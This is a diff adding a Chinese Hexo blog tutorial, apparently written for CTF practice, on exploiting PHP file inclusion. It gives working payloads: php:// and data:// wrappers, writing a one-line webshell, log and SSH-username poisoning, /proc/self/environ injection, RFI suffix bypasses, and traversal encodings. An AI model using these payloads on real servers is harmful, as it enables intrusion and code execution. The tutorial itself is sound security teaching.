@@ -1,0 +1,1047 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/touxiang.ico">
+  <link rel="icon" href="/img/touxiang.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="yunli">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一.什么是文件包含漏洞  PHP文件包含漏洞在对服务端所利用requie()，include()，requie_once()，include_once()的不安全包含文件，在这个四个函数中，无论文件为任意类型，只要内容为php代码，就会在包含的时候自动读取代码内容并执行。 require_once() 和 include_once() 功能与require() 和 include() 类似。但如果">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OWTOP10芝文件包含">
+<meta property="og:url" content="http://blog.yunli1.com/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="noob weber">
+<meta property="og:description" content="一.什么是文件包含漏洞  PHP文件包含漏洞在对服务端所利用requie()，include()，requie_once()，include_once()的不安全包含文件，在这个四个函数中，无论文件为任意类型，只要内容为php代码，就会在包含的时候自动读取代码内容并执行。 require_once() 和 include_once() 功能与require() 和 include() 类似。但如果">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.yunli1.com/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png">
+<meta property="og:image" content="http://blog.yunli1.com/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png">
+<meta property="og:image" content="http://blog.yunli1.com/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png">
+<meta property="og:image" content="http://blog.yunli1.com/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.png">
+<meta property="og:image" content="http://blog.yunli1.com/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/5.png">
+<meta property="og:image" content="http://blog.yunli1.com/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/6.png">
+<meta property="og:image" content="http://blog.yunli1.com/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/7.png">
+<meta property="og:image" content="http://blog.yunli1.com/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/8.png">
+<meta property="og:image" content="http://blog.yunli1.com/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/9.png">
+<meta property="article:published_time" content="2026-04-23T13:01:23.000Z">
+<meta property="article:modified_time" content="2026-05-24T02:04:07.030Z">
+<meta property="article:author" content="yunli">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://blog.yunli1.com/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png">
+  
+  
+  
+  <title>OWTOP10芝文件包含 - noob weber</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.yunli1.com","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>yunli&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/links/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-link-fill"></i>
+                  <span>友链</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="OWTOP10芝文件包含"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-23 21:01" pubdate>
+          2026年4月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          56 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">OWTOP10芝文件包含</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2>一.什么是文件包含漏洞</h2>
+
+<p>PHP文件包含漏洞在对服务端所利用requie()，include()，requie_once()，include_once()的不安全包含文件，在这个四个函数中，无论文件为任意类型，只要内容为php代码，就会在包含的时候自动读取代码内容并执行。</p>
+<p>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p>
+<h2>二.文件包含的类型</h2>
+
+<p>文件包含漏洞存在以下两种类型：</p>
+<ul>
+<li><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。</p>
+</li>
+<li><h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
+<ol>
+<li>allow_url_fopen &#x3D; On</li>
+<li>allow_url_include &#x3D; On</li>
+</ol>
+<p>两个配置选项均需要为On，才能远程包含文件成功。</p>
+<p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。如果<code>allow_url_fopen=off</code>那么远程 URL wrapper就不行了（wrapper是流包装器），例如data，http，ftp这些协议就无法使用</p>
+</li>
+</ul>
+<h2>三.文件包含的利用姿势</h2>
+
+<p>无论是怎么样的文件包含利用姿势，都殊途同归</p>
+<p>文件包含漏洞利用 &#x3D;</p>
+<p>① 找 include 点<br>② 找一个“你能控制内容”的地方<br>③ 让这个地方出现 PHP 代码<br>④ 被 include → 执行</p>
+<h3>伪协议</h3>
+
+
+
+<h4>file://协议</h4>
+
+<p>file:&#x2F;&#x2F; 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响<br>可用于读取一些隐秘文件，但相对来说只有非常简单的题目才可利用这一点，一般都不会简单读取</p>
+<h4>php://协议</h4>
+
+<p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;filter用于读取源码。<br>php:&#x2F;&#x2F;input用于执行php代码。</p>
+<p>php:&#x2F;&#x2F;filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。<br>利用条件:</p>
+<p>allow_url_fopen ：off&#x2F;on<br>allow_url_include：off&#x2F;on<br>例如有一些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码是不会显示在页面上的，例如打开当前目录下的2.php:</p>
+<p><img src="/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>他只显示了一条语句，这时候我们可以以base64编码的方式读取指定文件的源码:</p>
+<p>输入<br><strong>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;文件路径</strong><br>得到2.php加密后的源码：</p>
+<p><img src="/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>再进行base64解码，获取到2.php的完整源码信息：</p>
+<p><img src="/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。但这里还要提一个点，php:&#x2F;&#x2F;input是一次性数据流，所以如果代码中有在include前使用了数据，那么在include的时候数据就空了，例如前面有一个file_get_content()，一般来说框架中也可能会有这种操作，所以需要留意<br>利用条件:</p>
+<p>allow_url_fopen ：off&#x2F;on<br>allow_url_include：on<br>利用该方法，我们可以直接写入php文件，输入file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，写入php代码：</p>
+<p><img src="/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>发送报文，可以看到本地生成了一句话木马：</p>
+<p><img src="/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4>ZIP://协议</h4>
+
+<p>zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p>
+<p>zip:&#x2F;&#x2F;中只能传入绝对路径。<br>要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）<br>只需要是zip的压缩包即可，后缀名可以任意更改。<br>相同的类型还有zlib:&#x2F;&#x2F;和bzip2:&#x2F;&#x2F;<br>利用条件:</p>
+<p>allow_url_fopen ：off&#x2F;on<br>allow_url_include：off&#x2F;on<br>POC为：</p>
+<p><img src="/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/6.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>zip:&#x2F;&#x2F;[压缩包绝对路径]#[压缩包内文件]?file&#x3D;zip:&#x2F;&#x2F;D:\1.zip%23phpinfo.txt</p>
+<h4>data://协议</h4>
+
+<p>data:&#x2F;&#x2F; 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p>
+<p>利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：<br>利用条件:</p>
+<p>allow_url_fopen ：on<br>allow_url_include：on<br>POC为:</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span><br><span class="language-xml">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">/?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>]<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">这个POC可以输出页面的目录路径</span><br><span class="language-xml"></span><br><span class="language-xml">?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/var/www&#x27;</span>)); <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">读取该路径文件</span><br><span class="language-xml"></span><br><span class="language-xml">/?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;fl4gisisish3r3.php&#x27;</span>); <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$a</span>); <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">读取文件内容</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4>伪协议利用条件</h4>
+
+<p>伪协议的利用方法还有很多，这里就不一一举例了。<br>伪协议的用法小结</p>
+<p><img src="/2026/04/23/OWTOP10%E8%8A%9D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/9.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h3>包含session</h3>
+
+<p>要想学会利用包含session，就要先清楚seesion的会话机制</p>
+<p><strong>会话存储方式</strong></p>
+<p><code>Java</code>是将用户的session存入内存中，而<code>PHP</code>则是将session以文件的形式存储在服务器某个文件中。</p>
+<p>利用条件：session文件路径已知，且其中内容部分可控。</p>
+<p>姿势：</p>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
+<p>常见的php-session存放位置：</p>
+<ol>
+<li>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID</li>
+<li>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID</li>
+<li>&#x2F;tmp&#x2F;sess_PHPSESSID</li>
+<li>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</li>
+</ol>
+<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。</p>
+<p>具体可参考下面这篇文章学习：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201177">https://www.anquanke.com/post/id/201177</a><br>，写得非常详细，我就不献丑了</p>
+<p>PHP在文件上传和读取的过程中还有一个利用session专门记载进程的功能，我们还可以利用这点包含生成的临时文件，这个后面实验后专门开一章讲解一下。</p>
+<h3>包含日志</h3>
+
+<h4>1.访问日志</h4>
+
+<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 &#x2F;var&#x2F;log&#x2F;apache2&#x2F;。</p>
+<p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。</p>
+<p>正常的php代码已经写入了 &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log。然后进行包含即可。</p>
+<p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs maxima">常见日志路径：<br><br>Linux + Nginx：<br>/<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span><br>/<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span>/nginx/<span class="hljs-built_in">error</span>.<span class="hljs-built_in">log</span><br><br>Linux + Apache：<br>/<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span>/apache2/access.<span class="hljs-built_in">log</span><br>/<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span>/apache2/<span class="hljs-built_in">error</span>.<span class="hljs-built_in">log</span><br><br>有些系统（如 CentOS）：<br>/<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span>/httpd/access_log<br>/<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span>/httpd/error_log<br><br>Linux + PHP-FPM：<br>/<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span>/php-fpm.<span class="hljs-built_in">log</span><br>/<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span>/php7<span class="hljs-number">.4</span>-fpm.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4>2.ssh log</h4>
+
+<p>首先补充一点有关ssh的知识：<br>ssh基础连接语句:</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">ssh <span class="hljs-comment">[选项]</span> <span class="hljs-comment">[用户名]</span>@<span class="hljs-comment">[主机名或IP地址]</span> <span class="hljs-comment">[-p 端口号]</span><br></code></pre></td></tr></table></figure>
+
+<p>若语句中为不存在的用户，会显示连接不上，但日志会记录这个不存在的用户的尝试连接日志，这里我们就可以利用恶意语句作为用户名被包含达到利用目的</p>
+<p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 &#x2F;var&#x2F;log&#x2F;auth.log</p>
+<p>姿势：</p>
+<p>用ssh连接：</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">ubuntu@VM-207-93-ubuntu:~$ ssh &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;@remotehost</span><br></code></pre></td></tr></table></figure>
+
+<p>之后会提示输入密码等等，随便输入。</p>
+<p>然后在remotehost的ssh-log中即可写入php代码：</p>
+<p>之后进行文件包含即可。</p>
+<h3>包含environ</h3>
+
+<p>利用条件：</p>
+<ol>
+<li>php以cgi方式运行，这样environ才会保持UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ol>
+<p>姿势：</p>
+<p>proc&#x2F;self&#x2F;environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
+<h3>包含fd</h3>
+
+<p>先来介绍一下，什么是fd：</p>
+<p>在linux系统中，有一句名言，一切皆文件。在我们启动软件使用进程时也会创建文件，而fd就是文件描述符。标准输入（standard input）的文件描述符是 0，标准输出（standard output）是 1，标准错误（standard error）是 2。<br>若是想了解更具体是如何实现的可以找寻相关资料学习，还是蛮有意思的。</p>
+<p>后面的利用就和environ差不多，就不多赘述了。</p>
+<h2>四.绕过方法</h2>
+
+<h3>指定前缀</h3>
+
+<p>1.目录遍历<br>目录遍历是我现在了解到的较为通用的方法，若是<code>.</code>或<code>/</code>被过滤可用下面方法尝试绕过</p>
+<ul>
+<li>url编码<ul>
+<li>..&#x2F;<ul>
+<li>%2e%2e%2f</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%2e%2e%5c</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>二次编码<ul>
+<li>..&#x2F;<ul>
+<li>%252e%252e%252f</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%252e%252e%255c</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>服务器&#x2F;容器的编码方式<ul>
+<li>..&#x2F;<ul>
+<li>..%c0%af</li>
+<li>%c0%ae%c0%ae&#x2F;</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>..%c1%9c</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>2.简单了解好像伪协议也可以利用，读取到伪协议会将前面的字段忽略掉，但这个还没看见有实验结果图，需要自己实验后才可以确认，偷个懒，先留一下</p>
+<h3>指定后缀</h3>
+
+<p>1.url格式</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">protocol <span class="hljs-symbol">://</span> hostname[<span class="hljs-symbol">:port</span>] / path / [;parameters][<span class="hljs-string">?q</span>uery]<span class="hljs-comment">#fragment</span><br></code></pre></td></tr></table></figure>
+
+<p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。</p>
+<p>姿势一：query（？）</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=http:<span class="hljs-comment">//remoteaddr/remoteinfo.txt?</span><br></code></pre></td></tr></table></figure>
+
+<p>则包含的文件为 <a target="_blank" rel="noopener" href="http://remoteaddr/remoteinfo.txt?/test/test.php">http://remoteaddr/remoteinfo.txt?/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作query从而被绕过。</p>
+<p>姿势二：fragment（#）</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=http:<span class="hljs-comment">//remoteaddr/remoteinfo.txt%23</span><br></code></pre></td></tr></table></figure>
+
